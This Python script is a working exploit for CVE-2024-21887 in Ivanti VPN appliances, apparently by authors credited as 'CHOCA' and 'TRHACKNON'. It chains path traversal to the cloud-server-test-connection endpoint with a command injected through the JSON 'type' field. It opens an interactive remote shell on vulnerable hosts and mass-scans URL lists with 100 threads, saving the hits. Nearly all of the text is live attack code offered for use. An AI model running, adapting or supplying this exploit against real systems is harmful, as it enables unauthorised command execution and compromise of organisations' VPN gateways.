import json
import urllib3
import requests
import argparse

from rich.console import Console
from alive_progress import alive_bar
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed
from pyfiglet import Figlet
from colorama import Fore, Style
import questionary
from time import time,strftime,gmtime,sleep
from math import ceil


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import socket, subprocess, platform, concurrent.futures, os, random
if platform.system() == 'Windows':
    cmd = 'cls'
    exc = 'python'
else:
    cmd = 'clear'
    exc = 'python3'
##[------------------------------[LIBS]--------------------------------]##
##[-------------------------------[COLORS]--------------------------------]##
R,G,B,C,M,Y = "\033[0;31;40m","\033[0;32;40m","\033[0;34;40m","\033[0;36m",'\033[95m',"\033[0;33;40m"
BOLD,UNDER,END = '\033[1m','\033[4m','\033[0m'
log = strftime("[%H:%M:%S]", gmtime())
##[-------------------------------[COLORS]--------------------------------]##
##[-------------------------------[LOGO]--------------------------------]##
def logo():
    ktns = ['\033[0;36m', '\033[95m', '\033[0;31;40m', '\033[92m', '\033[94m']
    for _ in range(35):
        random.shuffle(ktns)
        color = ktns[1]
        b = END+BOLD +'''            
                               ___  _____   _________  ________  
                              / _ \/ __/ | / / __/ _ \/ __/ __/  
                             / , _/ _/ | |/ / _// , _/\ \/ _/    
                            /_/|_/___/ |___/___/_/|_/___/___/'''+color+BOLD +'''    
                                 H
                                 |
                           H  H  C--H.   
                            `.|,'|
                              C  H  H
                              |     |
                         O    N  H  C
                         // ,' `.|,'|`.
                           C     C  H  H
                           |     |
                        H--C     H ''' + Y +BOLD+ ''' [V]-: 1.0''' + color+BOLD + '''
                         ,' `.__   ''' + Y +BOLD+ ''' [?]-:  CHOCA AND ''' + END+BOLD + M +BOLD+ ''' TRHACKNON ''' + END+BOLD + Y +BOLD+ ''' WORKS  ''' + END+BOLD + '''
                        /  _/ _ \  ''' + Y +BOLD+ ''' [Author]-: ''' + END+BOLD + M +BOLD+ '''  CHOCA''' + END+BOLD + '''       
                       _/ // ___/                
                      /___/_/'''+color+BOLD +''' 
                  H  H--C  H--C--H
                  |     ||    |
            H     C     C     N  H  H
             `. ,' `. ,' `. ,' `.|,'
               C  _  C  H  C     C
               | (_) |   `.|     |
               C     C     C     H
             ,' `. ,' `. ,' `.
            H     C     C     H
                  |    ||
                  N-----C
                  |     |
                  H     H'''+END+BOLD +''' 
           __   __/___/_/_  __ ____  _____   
          / /  / __ \/ __ \/ //_/ / / / _ \  
         / /__/ /_/ / /_/ / ,< / /_/ / ___/  
        /____/\____/\____/_/|_|\____/_/   '''+'\n'+'\n'+'\x1b[6;30;42m' + 'LOADING...' + '\x1b[0m' 
        os.system(cmd)
        print(b)
        sleep(0.1)


class CVE_2024_21887:
    def __init__(self, base_url):
        self.base_url = base_url
        self.console = Console()
        self.session = requests.Session()
        self.session.trust_env = False

    def send_backup_code_request(self, type_value="id"):
        data = {"type": f";{type_value};"}
        url = f"{self.base_url}/api/v1/totp/user-backup-code/%2E%2E/%2E%2E/system/maintenance/archiving/cloud-server-test-connection"
        try:
            response = self.session.post(url, json=data, verify=False, timeout=10)
            if response.headers.get("Content-Type") == "application/json":
                try:
                    response_json = response.json()
                    if "error" in response_json:
                        return response_json["error"]
                except json.JSONDecodeError:
                    pass
            return None
        except requests.exceptions.RequestException as e:
            pass

    def check_vulnerability(self):
        error_message = self.send_backup_code_request()
        if error_message:
            self.console.print(
                f"[bold green][+] {self.base_url} is[/bold green][bold purple] vulnerable[/bold purple][bold blue]! [/bold blue]\n[bold yellow]{error_message}[/bold yellow]"
            )

        return error_message

    def interactive_shell(self):
        session = PromptSession(InMemoryHistory())
        self.console.print(
            f"[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]\n[bold purple][!] Ivanti vpn vulnerability[/bold purple]"
        )
        while True:
            try:
                cmd = session.prompt(HTML("<ansired><b># </b></ansired>"))
                match cmd.lower():
                    case "exit":
                        break
                    case "clear":
                        self.console.clear()
                    case _:
                        response = self.send_backup_code_request(cmd)
                        if response:
                            self.console.print(response)
            except KeyboardInterrupt:
                break


def process_url(url, output_file=None):
    scanner = CVE_2024_21887(url)
    if scanner.check_vulnerability():
        if output_file:
            with open(output_file, "a") as outfile:
                outfile.write(url + "\n")
        return url
    return None


def main():
    logo()
    parser = argparse.ArgumentParser(
        description="CVE-2024-21887 Exploit Script. This script is designed to detect and interact with systems vulnerable to CVE-2024-21887."
    )
    parser.add_argument(
        "-u",
        "--url",
        help="Specify a single URL to scan. Use this mode for a focused scan on one target.",
    )
    parser.add_argument(
        "-f",
        "--file",
        help="Specify a file path containing a list of URLs for bulk scanning. Each URL should be on a new line.",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=100,
        help="Set the number of concurrent threads for bulk scanning. Default is 100.",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Specify a file path to save the URLs that are found to be vulnerable. Results are appended to this file in real time.",
    )

    args = parser.parse_args()

    match args:
        case args if args.url:
            scanner = CVE_2024_21887(args.url)
            if scanner.check_vulnerability():
                scanner.interactive_shell()

        case args if args.file:
            with open(args.file) as file:
                urls = file.read().splitlines()
                with alive_bar(len(urls), enrich_print=False) as bar:
                    with ThreadPoolExecutor(max_workers=args.threads) as executor:
                        futures = [
                            executor.submit(process_url, url, args.output)
                            for url in urls
                        ]
                        for future in as_completed(futures):
                            future.result()
                            bar()
            if args.output:
                print(f"Vulnerable URLs saved to {args.output}")

        case _:
            parser.print_help()


if __name__ == "__main__":
    main()
